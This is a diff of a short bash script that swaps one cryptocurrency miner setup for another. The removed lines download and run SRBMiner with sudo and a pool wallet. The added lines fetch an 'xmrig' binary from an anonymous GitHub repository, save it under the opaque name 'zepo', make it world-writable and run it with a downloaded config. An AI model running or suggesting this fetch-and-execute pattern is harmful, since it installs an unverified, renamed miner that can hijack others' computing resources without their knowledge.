@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.0/SRBMiner-Multi-1-0-0-Linux.tar.xz
-tar xf SRBMiner-Multi-1-0-0-Linux.tar.xz
-cd SRBMiner-Multi-1-0-0
-sudo ./SRBMiner-MULTI --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --disable-cpu-optimisations --disable-huge-pages --disable-hw-aes --disable-msr-tweaks --disable-numa
+wget -O zepo https://raw.githubusercontent.com/6248202226/filesg/main/xmrig
+wget https://raw.githubusercontent.com/6248202226/filesg/main/a.json
+chmod 777 zepo
+./zepo -c "a.json"
